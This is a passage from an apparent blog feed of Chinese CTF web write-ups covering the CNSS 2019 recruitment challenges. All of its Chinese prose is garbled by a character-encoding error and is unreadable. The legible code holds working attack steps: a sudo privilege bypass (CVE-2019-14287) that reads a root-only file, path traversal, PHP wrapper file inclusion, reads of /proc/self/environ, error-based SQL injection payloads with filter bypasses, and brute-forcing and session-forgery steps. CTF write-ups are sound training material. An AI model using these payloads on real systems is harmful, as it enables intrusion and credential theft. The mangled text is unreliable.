çš„å‡½æ•°å¹¶æ²¡æœ‰è¢«ç¦ç”¨ï¼Œç›´æ¥æ‹¿åˆ°ç³»ç»Ÿshellï¼ˆè¿™é‡Œæˆ‘æƒ³å†æ‰”åˆ°èšå‰‘é‡Œï¼Œä½†è«åå…¶å¦™è¿ä¸ä¸Šï¼Œå°±æ‰‹åŠ¨æ“ä½œäº†ï¼‰</p><h2 id="0x05-è¯»å–-flag-æ–‡ä»¶"><a href="#0x05-è¯»å–-flag-æ–‡ä»¶" class="headerlink" title="0x05 è¯»å– flag æ–‡ä»¶"></a>0x05 è¯»å– flag æ–‡ä»¶</h2><p>æ ¹æ® hint ï¼Œåªæœ‰ root ç”¨æˆ·å¯ä»¥è¯»å– flag æ–‡ä»¶ï¼Œå°è¯• <code>sudo cat</code>ï¼Œå‘ç°å¹¶ä¸èƒ½è¯»å–ï¼Œ<code>sudo -l</code> çœ‹ä¸€ä¸‹æƒé™ï¼Œå‘ç°æƒé™è®¾ç½®å¦‚ä¸‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(ALL,!root) NOPASSWD:&#x2F;bin&#x2F;cat</span><br></pre></td></tr></table></figure><p>ç›´æ¥ä½¿ç”¨ <code>sudo</code> æ— æ³•ä½¿ç”¨ <code>cat</code> ï¼Œè¿™é‡Œæˆ‘æ¢ç´¢äº†æ¥è¿‘ä¸¤å°æ—¶ç»ˆäºæœåˆ°äº†ä¸€ä¸ªç¥å¥‡çš„æ¼æ´ <code>CVE-2019-14287</code> ï¼Œæ¼æ´å…·ä½“ä¿¡æ¯å¯ä»¥å‚è€ƒæˆ‘å¥½ä¸å®¹æ˜“æœåˆ°çš„çš„<a href="https://www.agesec.com/8369.html" target="_blank" rel="noopener">è¿™ä¸ªç½‘ç«™</a><br>æ ¹æ®è¿™ä¸ªæ¼æ´æ‰§è¡Œä»¥ä¸‹å‘½ä»¤</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -u<span class="comment">#-1 /bin/cat /flag</span></span><br></pre></td></tr></table></figure><p>æˆåŠŸè·å¾— flagï¼ï¼ï¼ï¼ˆæ³ªç›®ï¼‰</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-åæ§½æ€è€ƒ-for-BOSS-Get-Me-Inside&quot;&gt;&lt;a href=&quot;#0x00-åæ§½æ€è€ƒ-for-BOSS-Get-Me-Inside&quot; class=&quot;headerlink&quot; title=&quot;0x00 åæ§½æ€è€ƒ for [BOSS] Get Me 
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://x5tar.com/categories/CTF/"/>
    
    
      <category term="CNSS" scheme="https://x5tar.com/tags/CNSS/"/>
    
      <category term="WriteUp" scheme="https://x5tar.com/tags/WriteUp/"/>
    
  </entry>
  
  <entry>
    <title>CNSS Recruit 2019 Web WriteUp</title>
    <link href="https://x5tar.com/2019/10/24/cnss-recruit-2019-web/"/>
    <id>https://x5tar.com/2019/10/24/cnss-recruit-2019-web/</id>
    <published>2019-10-24T09:58:45.000Z</published>
    <updated>2020-02-18T13:50:55.587Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>ç”±äºæŠ€æœ¯æœ‰é™ï¼Œæ—¶é—´åŒ†å¿™ï¼Œæœ¬æ–‡å¯èƒ½å­˜åœ¨å„ç§é—®é¢˜ã€‚å¦‚å‘ç°é—®é¢˜ï¼ˆå¦‚æ€è·¯é”™è¯¯ã€æœ¯è¯­é”™è¯¯ æˆ– æˆ‘çš„è§£æ³•å‡­ç©ºå¢åŠ äº†è§£é¢˜éš¾åº¦ ç­‰ï¼‰ï¼Œè¯·å„ä½ dalao æ¯«ä¸çŠ¹è±«çš„é”¤çˆ†æˆ‘çš„ç‹—å¤´ï¼Œè°¢è°¢ï¼</p><p>æ„Ÿè°¢ <strong>ay3</strong> å¯¹ <code>äº§å“ç»ç†</code> ä¸€é¢˜è§£é¢˜æ€è·¯çš„æŒ‡æ­£ï¼Œæ„Ÿè°¢ dalaoï¼</p></blockquote><h2 id="check-in"><a href="#check-in" class="headerlink" title="check_in"></a>check_in</h2><hr><p>web çš„ç¬¬ä¸€é“ç­¾åˆ°é¢˜ï¼Œæ‰“å¼€å°±è¯´äº† hideï¼Œæœæ–­ <code>F12</code> çœ‹æºç ï¼Œå‘ç°æ³¨é‡Šé‡Œæœ‰äº›ä¸œè¥¿</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--what is this : ./secret/f1ag_is_h4re.php--&gt;</span></span><br></pre></td></tr></table></figure><p>ç›´æ¥åœ¨urlåæ·»åŠ  <code>/secret/f1ag_is_h4re.php</code> è¿›å…¥<del>ä¸‹ä¸€å…³</del>ï¼Œè¿™é‡Œå†çœ‹æºç å¹¶æ— æ”¶è·ï¼Œçœ‹ä¸€ä¸‹ Cookieï¼Œå‘ç°å¤šäº†ä¸€æ¡åä¸º <code>interesting_string</code> çš„ Cookieï¼ŒæŸ¥çœ‹å…¶å†…å®¹å¦‚ä¸‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Y25zc3t3ZWxjb21lX3RvX3dlYl9XMHJsZCF9</span><br></pre></td></tr></table></figure><p>çŒœæµ‹ä¸ºæŸç§ç¼–ç ï¼Œå°è¯• base64 è§£ç ï¼ŒæˆåŠŸè·å– flag</p><h2 id="True-check-in"><a href="#True-check-in" class="headerlink" title="True_check_in"></a>True_check_in</h2><hr><p>çœŸæ­£çš„ç­¾åˆ°é¢˜ï¼Ÿæ‰“å¼€å‘ç°æ˜¯ä¸€ä¸ª<del>æ•°å­¦é¢˜</del>ï¼Œæœæ–­æ‰“å¼€è®¡ç®—å™¨ç®—å‡ºæ­£ç¡®ç­”æ¡ˆ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">8589934592</span><br></pre></td></tr></table></figure><p>è¾“å…¥ç­”æ¡ˆæ—¶å‘ç°é—®é¢˜ï¼Œè¾“å…¥æ¡†æœ‰é•¿åº¦é™åˆ¶ï¼Œçœ‹æºç ï¼Œå‘ç°æœ€å¤§é•¿åº¦ä¸º 8ï¼Œè€Œæˆ‘ä»¬çš„ç­”æ¡ˆæœ‰åä½ï¼Œä½†è¿™é‡Œé•¿åº¦é™åˆ¶åœ¨å‰ç«¯ï¼Œæ‰“å¼€ Burp Suite ä¸€é€šæŠ“åŒ…æ”¹åŒ…ï¼ˆä¹Ÿå¯å®¡æŸ¥å…ƒç´ ç›´æ¥æ”¹maxlengthï¼‰ï¼Œè¾“å…¥æ­£ç¡®ç­”æ¡ˆï¼ŒæˆåŠŸè·å– flag</p><h2 id="warm-up"><a href="#warm-up" class="headerlink" title="warm_up"></a>warm_up</h2><hr><p>æ¥çƒ­ä¸ªèº«ï¼çœ‹åˆ°é¢˜ç›®å³æƒ³åˆ°ä¿®æ”¹ <code>header</code>ï¼Œè¿™é‡Œç”¨åˆ°äº† <code>User-Agent</code> ã€ <code>X-Forwarded-For</code> å’Œ <code>Referer</code></p><p>é¦–å…ˆåœ¨ <code>User-Agent</code> ä¸­æ·»åŠ  cnssï¼Œæˆ–ç›´æ¥å°†å…¶ä¸­æµè§ˆå™¨åç§°æ”¹ä¸º cnss</p><p>PSï¼šè¿™é‡Œåº”æ³¨æ„ï¼Œä¸è¦å°† UA å†…å®¹å…¨éƒ¨åˆ é™¤åªå†™å…¥ cnssï¼Œè¿™æ ·æœ‰å¯èƒ½æœåŠ¡å™¨æ— æ³•è§£æè€Œæ‹¿ä¸åˆ° flag</p><p>ç„¶åæ·»åŠ ä¸‹é¢ä¸¤å¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: 233.233.233.233</span><br><span class="line">Referer: www.notcnss.com</span><br></pre></td></tr></table></figure><p>å°†åŒ…å‘å‡ºï¼ŒæˆåŠŸè·å– flag</p><h2 id="GAYâ€™-Profile"><a href="#GAYâ€™-Profile" class="headerlink" title="GAYâ€™ Profile"></a>GAYâ€™ Profile</h2><hr><p><del>ä¸€çœ¼æœ›å»ï¼Œå¥½GAYçš„é¢˜</del>é¦–å…ˆçœ‹æºç ï¼Œå‘ç°å¦‚ä¸‹æ³¨é‡Š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Why not try to get /source ? --&gt;</span></span><br></pre></td></tr></table></figure><p>æœæ–­ url ååŠ  <code>/source</code>ï¼Œæ‹¿åˆ°æºç ï¼Œå‘ç°åœ¨ <code>/file</code> ä¸­é€šè¿‡nameå‚æ•°å¯ä»¥è¯»å–æ–‡ä»¶ï¼Œç»“åˆ hint ä¸­æ‰€è¯´ flag åœ¨ <code>/flag</code> ä¸­æ„é€  url</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;file?name&#x3D;..&#x2F;flag</span><br></pre></td></tr></table></figure><p>åˆ«é—®æˆ‘ä¸ºä»€ä¹ˆ flag åœ¨ä¸Šä¸€çº§ç›®å½•ï¼Œè¯•ä¸€è¯•å°±å‡ºæ¥äº†ï¼ˆé€ƒï¼ŒæˆåŠŸè·å– flag</p><h2 id="love-reading"><a href="#love-reading" class="headerlink" title="love_reading"></a>love_reading</h2><hr><p>æ‹¿åˆ°è¿™é“é¢˜ï¼Œåªç»™äº†ä¸¤å¥è¯ï¼Œä¹ä¸€çœ‹æ¯”è¾ƒæ‡µ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Evil robot take my love. I only know that he uses linux.</span><br></pre></td></tr></table></figure><p>ç»†ç»†åˆ†æè¿™ä¸¤å¥è¯ä¸­çš„æç¤ºï¼Œå‘ç° <code>robot</code> å’Œ <code>linux</code> åº”è¯¥æœ‰ä½œç”¨</p><p>å…ˆå°è¯•åœ¨ url åæ·»åŠ  <code>/robots.txt</code>ï¼Œ å‡ºç°äº† <code>s4cret.php</code>ï¼Œç›´æ¥ä¿®æ”¹ urlï¼Œ<del>æƒŠå–œçš„</del>å‘ç°ä¸€ç‰‡ç©ºç™½</p><p>è¯» hint å‘ç° <code>vim in linux</code> ï¼Œçœ¼å‰ä¸€äº®ï¼Œå³æƒ³åˆ° vim äº§ç”Ÿçš„ä¸´æ—¶æ–‡ä»¶</p><p>åˆ†åˆ«å°è¯• <code>/.s4cret.php.swp</code> å’Œ <code>/.index.php.swp</code>ï¼Œå‘ç° index.php å­˜åœ¨ä¸´æ—¶æ–‡ä»¶ï¼Œç”¨ vim è¿˜åŸï¼Œå¾—åˆ°æºç </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">if(!(isset($_GET[&#39;key&#39;]) &amp;&amp; isset($_GET[&#39;f&#39;])))&#123;</span><br><span class="line">4die();</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">4$path &#x3D; $_GET[&#39;key&#39;];</span><br><span class="line">4$data &#x3D; file_get_contents($path);</span><br><span class="line">4if($data !&#x3D; &quot;zhi ma kai men!&quot;)&#123;</span><br><span class="line">44die(&quot;no no nope&quot;);</span><br><span class="line">4&#125;</span><br><span class="line">4$f &#x3D; $_GET[&#39;f&#39;];</span><br><span class="line">4include($f);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æºç ä¸é•¿ï¼Œå‘ç°æœ‰ä¸¤ä¸ªå‚æ•° <code>key</code> å’Œ <code>f</code>ï¼Œåˆ†åˆ«è°ƒç”¨ <code>file_get_contents()</code> å’Œ <code>include()</code>ï¼Œåº”ä»è¿™ä¸¤ä¸ªåœ°æ–¹å…¥æ‰‹ï¼Œç”±äºæ²¡æœ‰ä»»ä½•è¿‡æ»¤æœºåˆ¶ï¼Œæ•…ç›´æ¥è€ƒè™‘ PHP ä¼ªåè®®</p><p>ç¬¬ä¸€ä¸ªå‚æ•°åº”ç”¨è‡ªå·±çš„è¾“å…¥ä»£æ›¿è·å–æ–‡ä»¶å†…å®¹ï¼Œå¯ç”¨ <code>php://input</code> åŠ  POST ä¼ å‚ç›´æ¥ç»•è¿‡</p><p>ç¬¬äºŒä¸ªå‚æ•°åº”ä¸º <code>include()</code> çš„ä»»æ„æ–‡ä»¶è¯»å–ï¼Œç”¨ <code>php://filter</code> å³å¯</p><p>æ•…æ„é€ ä»¥ä¸‹url</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?key&#x3D;php:&#x2F;&#x2F;input&amp;f&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;s4cret.php</span><br></pre></td></tr></table></figure><p>ç„¶å Burp Suite æŠ“åŒ…ï¼Œè¯·æ±‚æ–¹æ³•æ”¹ä¸º <code>POST</code>ï¼Œè¯·æ±‚ä½“æ·»åŠ  zhi ma kai men!ï¼Œè·å¾—ä¸€æ®µ base64 ç¼–ç çš„æ–‡æœ¬ï¼ˆæˆ–ç›´æ¥é‡‡ç”¨ HackBar å‘é€ POST è¯·æ±‚ï¼‰ï¼Œè§£ç åå¯çœ‹åˆ°ä¸€æ®µç¥å¥‡çš„æ³¨é‡Šï¼ŒæˆåŠŸè·å¾—flag</p><h2 id="Gay-Profile-Plus"><a href="#Gay-Profile-Plus" class="headerlink" title="Gay Profile Plus"></a>Gay Profile Plus</h2><hr><p><del>ç»§ç»­ gay</del>çœ‹æºç ï¼Œç»§ç»­ <code>/source</code>ï¼Œå‘ç°åŠ äº†ä¸€æ®µç¥å¥‡çš„è¯­å¥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> os.path.abspath(filename).startswith(os.getcwd()) <span class="keyword">and</span> filename != <span class="string">'./profile'</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'No No No'</span>, <span class="number">422</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œå¤§æ¦‚æ„æ€æ˜¯ï¼Œå¦‚æœè¦è¯»å–çš„æ–‡ä»¶åœ¨å½“å‰å·¥ä½œç›®å½•ï¼Œé‚£ä¹ˆå®ƒå¿…é¡»æ˜¯ <code>./profile</code>ï¼Œä½†æ˜¯é¢˜ç›®å‘Šè¯‰æˆ‘ä»¬ flag åœ¨ <code>./flag</code> ä¸­ï¼Œæ˜¾ç„¶ç›´æ¥è¯»å–å°±è¡Œä¸é€šäº†ï¼Œç”±æŠ“åŒ…å¯çŸ¥æœåŠ¡å™¨ä¸º Linuxï¼Œå¯è€ƒè™‘ <code>/proc</code> æ–‡ä»¶ç³»ç»Ÿ</p><blockquote><p>procæ–‡ä»¶ç³»ç»Ÿæ˜¯ä¸€ä¸ªä¼ªæ–‡ä»¶ç³»ç»Ÿï¼Œå®ƒåªå­˜åœ¨å†…å­˜å½“ä¸­ï¼Œè€Œä¸å ç”¨å¤–å­˜ç©ºé—´ã€‚å®ƒä»¥æ–‡ä»¶ç³»ç»Ÿçš„æ–¹å¼ä¸ºè®¿é—®ç³»ç»Ÿå†…æ ¸æ•°æ®çš„æ“ä½œæä¾›æ¥å£ã€‚ç”¨æˆ·å’Œåº”ç”¨ç¨‹åºå¯ä»¥é€šè¿‡procå¾—åˆ°ç³»ç»Ÿçš„ä¿¡æ¯ï¼Œå¹¶å¯ä»¥æ”¹å˜å†…æ ¸çš„æŸäº›å‚æ•°ã€‚ç”±äºç³»ç»Ÿçš„ä¿¡æ¯ï¼Œå¦‚è¿›ç¨‹ï¼Œæ˜¯åŠ¨æ€æ”¹å˜çš„ï¼Œæ‰€ä»¥ç”¨æˆ·æˆ–åº”ç”¨ç¨‹åºè¯»å–procæ–‡ä»¶æ—¶ï¼Œprocæ–‡ä»¶ç³»ç»Ÿæ˜¯åŠ¨æ€ä»ç³»ç»Ÿå†…æ ¸è¯»å‡ºæ‰€éœ€ä¿¡æ¯å¹¶æäº¤çš„ã€‚ï¼ˆæºè‡ªç½‘ç»œï¼‰</p></blockquote><p>ä¸€èˆ¬æ¥è¯´ <code>/proc</code> ç›®å½•ä¸‹æœ‰ä»¥ PID å‘½åçš„ç›®å½•ï¼Œå¯ä»¥é€šè¿‡æ­¤ç›®å½•è·å–è¿›ç¨‹æ‰€åœ¨ç›®å½•çš„æ–‡ä»¶ï¼Œä½†è¿™é‡Œæ˜¾ç„¶æ— æ³•è·å– PIDï¼Œä½†æºç ä¸­ <code>os.getcwd()</code> æé†’æˆ‘ä»¬è¦ç”¨å½“å‰å·¥ä½œç›®å½•ï¼Œäºæ˜¯æ„é€ ä»¥ä¸‹ url</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;file?name&#x3D;&#x2F;proc&#x2F;self&#x2F;cwd&#x2F;flag</span><br></pre></td></tr></table></figure><p>æˆåŠŸè·å¾— flag</p><h2 id="baby-sql"><a href="#baby-sql" class="headerlink" title="baby_sql"></a>baby_sql</h2><hr><p>ä½œä¸º sqli çš„ç¬¬ä¸€é¢˜ï¼Œæœ¬é¢˜å¹¶ä¸éš¾ï¼Œæœªè¿›è¡Œä»»ä½•è¿‡æ»¤ï¼Œä½†æ·»åŠ äº† <code>code</code> å‚æ•°è¿›è¡ŒéªŒè¯ï¼Œé˜²æ­¢äº†ç›´æ¥ SqlMapï¼Œä½†åªéœ€è¿›è¡Œç®€å• union æŸ¥è¯¢æ³¨å…¥å³å¯ï¼Œä½†åº”æ³¨æ„ï¼Œæ­¤å¤„ä»…æ˜¾ç¤ºæŸ¥è¯¢çš„ç¬¬ä¸€æ¡ç»“æœï¼Œæ•…æŸ¥è¯¢æ—¶åº”ç»™äºˆä¸€ä¸ªæ— å†…å®¹çš„ <code>id</code></p><p>ä¾æ¬¡æŸ¥è¯¢åº“åã€è¡¨åã€å­—æ®µåï¼Œç›´æ¥æŸ¥è¯¢å³å¯ï¼ŒæˆåŠŸè·å¾— flag</p><p>PSï¼šå¯é‡‡ç”¨ Python è„šæœ¬è‡ªåŠ¨è¾“å…¥ <code>code</code> å‚æ•°ï¼Œç¼©çŸ­æ“ä½œæ—¶é—´ï¼ˆå¦ä¸‰é“ sqli åŒç†ï¼‰</p><h2 id="èŸ’è›‡-Login-in"><a href="#èŸ’è›‡-Login-in" class="headerlink" title="èŸ’è›‡-Login_in"></a>èŸ’è›‡-Login_in</h2><hr><p>æ‰“å¼€å‘ç°ä¸€ä¸ªç™»å½•ç•Œé¢ï¼Œéœ€è¦æä¾›å¯†ç å’ŒéªŒè¯ç ï¼Œä¸”çŸ¥é“éªŒè¯ç MD5åçš„å‰ä¸‰ä½ï¼Œçœ‹æºç ï¼Œæœ‰ä»¥ä¸‹æ³¨é‡Š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--éªŒè¯ç ä¸€å…±4ä½æ•°å­—å­—æ¯ï¼Œå¯†ç éƒ½æ˜¯æ•°å­—ï¼ŒéªŒè¯ç æ­£ç¡®ä½ å°±çŸ¥é“å¯†ç ä½æ•°äº†--&gt;</span></span><br></pre></td></tr></table></figure><p>é‚£å°±å…ˆå†™ä¸€ä¸ªè®¡ç®—éªŒè¯ç çš„ python è„šæœ¬<br>å¾—åˆ°æ­£ç¡®çš„éªŒè¯ç å¹¶è¾“å…¥åï¼Œå¾—çŸ¥å¯†ç ä¸º4ä½æ•°å­—ï¼Œç”±äºæ²¡æœ‰ä»»ä½•å…¶ä»–æç¤ºï¼Œè¿™é‡Œé€‰æ‹©çˆ†ç ´æ³•ï¼Œåªéœ€ä» <code>0000</code> è¯•åˆ° <code>9999</code> å³å¯ï¼Œå°†ä¸Šé¢çš„è„šæœ¬è¿›è¡Œæ‰©å……ï¼ˆç”±äºéªŒè¯ç éšæœºï¼Œæ³¨æ„ä½¿ç”¨ <code>session</code>ï¼Œä¸”æ³¨æ„ <code>requests</code> è·å–ç½‘é¡µçš„ç¼–ç æ ¼å¼ï¼‰<br>è¾“å…¥è·å–åˆ°çš„æ­£ç¡®å¯†ç å’ŒéªŒè¯ç ï¼ŒæˆåŠŸè·å¾— flag</p><h2 id="Gay-Profile-Plus-Plus"><a href="#Gay-Profile-Plus-Plus" class="headerlink" title="Gay Profile Plus Plus"></a>Gay Profile Plus Plus</h2><hr><p>æ—¢ç„¶é¢˜å¹²å·²ç»è¯´äº†æ”¾åœ¨æ–‡ä»¶ä¸å®‰å…¨ï¼Œé‚£å°±ä¸å¯èƒ½ç›´æ¥ä»æœ¬åœ°æ–‡ä»¶è·å– flag äº†ï¼Œé‚£å¦‚ä½•æŠŠä¸€ä¸ªä¸œè¥¿å­˜å‚¨åœ¨æ–‡ä»¶ä¹‹å¤–å‘¢ï¼Ÿè¿™é‡Œæˆ‘ä»¬ç»§ç»­è€ƒè™‘ gay+ çš„æ—¶å€™ç”¨è¿‡çš„ <code>/proc</code> æ–‡ä»¶ç³»ç»Ÿï¼Œå› ä¸ºå®ƒå­˜åœ¨äºå†…å­˜ä¸­ï¼Œå½“ç„¶å°±ä¸æ˜¯æ–‡ä»¶äº†<br>æŸ¥çœ‹ <code>/proc</code> æ–‡ä»¶ç³»ç»Ÿçš„å…·ä½“è¯´æ˜ï¼Œå‘ç°åœ¨è¿›ç¨‹ç›®å½•ä¸‹å­˜åœ¨ä¸€ä¸ªç¯å¢ƒå˜é‡ï¼ŒçŒœæµ‹ flag å¯èƒ½å­˜åœ¨äºæ­¤ï¼Œæ•…æ„é€  url å¦‚ä¸‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;file?name&#x3D;&#x2F;proc&#x2F;self&#x2F;environ</span><br></pre></td></tr></table></figure><p>å‘ç° flag æœç„¶åœ¨æ­¤ï¼ŒæˆåŠŸè·å¾— flag</p><h2 id="äº§å“ç»ç†"><a href="#äº§å“ç»ç†" class="headerlink" title="äº§å“ç»ç†"></a>äº§å“ç»ç†</h2><hr><p>æŸ¥çœ‹æºç ï¼Œåœ¨ <code>db.php</code> çš„æ³¨é‡Šä¸­å‘ç°ä»¥ä¸‹ sql è¯­å¥</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">name char(64)</span><br><span class="line">...</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> products <span class="keyword">VALUES</span>(<span class="string">'cnss'</span>, sha256(....), <span class="string">'FLAG_HERE'</span>);</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>å¾—çŸ¥ <code>name</code> çš„é•¿åº¦æœ€å¤§ä¸º 64 ï¼Œ è€Œæˆ‘ä»¬éœ€è¦è·å– <code>name</code> ä¸º <code>cnss</code> å¤„çš„ <code>description</code><br>å› é¢˜å¹²è¯´äº†ä½¿ç”¨äº† PDO ï¼Œé¦–å…ˆæ’é™¤sqlæ³¨å…¥</p><p>è§‚å¯Ÿæºç ï¼Œå‘ç° <code>get_product</code> å’Œ <code>check_name_secret</code> åˆ†ç¦»</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">function get_product($name) &#123;</span><br><span class="line">  global $db;</span><br><span class="line">  $statement &#x3D; $db-&gt;prepare(</span><br><span class="line">    &quot;SELECT name, description FROM products WHERE name &#x3D; ?&quot;</span><br><span class="line">  );</span><br><span class="line">  ...&#125;</span><br><span class="line">function check_name_secret($name, $secret) &#123;</span><br><span class="line">  global $db;</span><br><span class="line">  $valid &#x3D; false;</span><br><span class="line">  $statement &#x3D; $db-&gt;prepare(</span><br><span class="line">    &quot;SELECT name FROM products WHERE name &#x3D; ? AND secret &#x3D; ?&quot;</span><br><span class="line">  );</span><br><span class="line">  ...&#125;</span><br></pre></td></tr></table></figure><p>å³éªŒè¯ <code>name</code> å’Œ <code>secret</code> å’Œè·å–ä¿¡æ¯å¹¶éåŒæ­¥è¿›è¡Œï¼Œè€Œè·å–ä¿¡æ¯æ—¶å¹¶ä¸éœ€è¦ <code>secret</code>ï¼Œè€ƒè™‘åˆ° Mysql å¯¹å°¾ç©ºæ ¼çš„å¤„ç†ï¼Œ<code>add</code> ä»¥ä¸‹å†…å®¹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Name: cnss + ä»»æ„ç©ºæ ¼</span><br><span class="line">Secret: ç¬¦åˆè¦æ±‚å³å¯</span><br><span class="line">Description: ä»»æ„</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œ <code>add</code> æ“ä½œåï¼Œ<code>view</code> ä»¥ä¸‹å†…å®¹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Name: cnss</span><br><span class="line">Secret: ä¸Šä¸€æ­¥è®¾ç½®çš„å¯†ç </span><br></pre></td></tr></table></figure><p>æ‰§è¡Œ <code>view</code> æ“ä½œï¼ŒæˆåŠŸè·å¾— flag</p><h2 id="easy-sql"><a href="#easy-sql" class="headerlink" title="easy_sql"></a>easy_sql</h2><hr><p>ç»è¿‡è¯•éªŒï¼Œå‘ç°è®¸å¤šå­—ç¬¦è¢«å±è”½ï¼Œæ¯”è¾ƒé‡è¦çš„æœ‰ï¼ˆéƒ½æœ‰æ–¹æ³•ç»•è¿‡æˆ–ä¸ä½¿ç”¨ï¼‰</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and  -  *  ç©ºæ ¼</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ <code>ç©ºæ ¼</code> å¯ç”¨ <code>%0a</code> ä»£æ›¿ï¼Œæ³¨é‡Šç¬¦å· <code>--</code> å¯ç”¨ <code>%23</code> ä»£æ›¿<br>ç”±äº <code>and</code> ä¸å¯ç”¨ï¼Œè¿™é‡Œè€ƒè™‘æŠ¥é”™æ³¨å…¥ï¼Œä¸”ç”±äº <code>*</code> ä¸å¯ç”¨ï¼Œè€ƒè™‘ xml çš„æŠ¥é”™ï¼Œç»æµ‹è¯•ï¼Œxml çš„æŠ¥é”™æ³¨å…¥å¯ç”¨ï¼Œæ•…æ„é€ å¦‚ä¸‹ payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1%27%0aor%0a(extractvalue(1,concat(0x7e,(......),0x7e)))%23</span><br></pre></td></tr></table></figure><p>åªéœ€å°† <code>......</code> å¤„ä¿®æ”¹ä¸ºæŸ¥è¯¢è¯­å¥ï¼Œå³å¯åœ¨æŠ¥é”™ä¸­çœ‹åˆ°æŸ¥è¯¢ç»“æœ<br>ä¾æ¬¡æŸ¥è¯¢åº“åã€è¡¨åã€å­—æ®µåï¼ŒæˆåŠŸè·å¾— flag</p><h2 id="True-Love"><a href="#True-Love" class="headerlink" title="True_Love"></a>True_Love</h2><hr><p>ä¸å¾—ä¸è¯´ï¼Œå‡ºé¢˜äººçœŸçš„æœ‰å¿ƒäº† <del>ä½†æ˜¯å…ˆåˆ«çœ‹è¿™ä¸ªå¿ƒäº†çœ‹é¢˜å§</del><br>ä»ç¬¬ä¸€ä¸ªç•Œé¢ç›®æµ‹æ‰¾ä¸åˆ°ä»€ä¹ˆæœ‰ç”¨ä¿¡æ¯ï¼Œä¸å¦¨æ‰“å¼€é¢˜ç›®æ‰€è¯´çš„ <code>/admin</code> ï¼Œçœ‹åˆ°ä¸€ä¸ªç™»é™†ç•Œé¢ï¼Œä¸”ç¬¬ä¸€è¡Œå°±è¯´</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">åªæœ‰adminæ‰èƒ½æ‹¿åˆ°flag</span><br></pre></td></tr></table></figure><p>é‚£å°±è®©æˆ‘ä»¬æˆä¸º admin ä¸å°±å¥½äº†<br>æŸ¥çœ‹ cookie å‘ç°ä¸€æ¡ session ï¼Œ base64è§£ç ï¼Œå‘ç°ç¬¬ä¸€æ®µä¸ºç”¨æˆ·åï¼Œè€ƒè™‘ session ä¼ªé€ ï¼Œè€Œç°åœ¨çš„é—®é¢˜åœ¨äºä¸çŸ¥é“å¯†é’¥ï¼Œé‚£å°±å…ˆæ‹¿åˆ°å¯†é’¥<br>éšä¾¿ä¿®æ”¹ <code>/</code> åçš„å†…å®¹ï¼Œå‘ç° <code>404</code> ç•Œé¢ä¸­æœ‰å‡ºé”™çš„ url ï¼Œç”±äºåç«¯ä¸º python 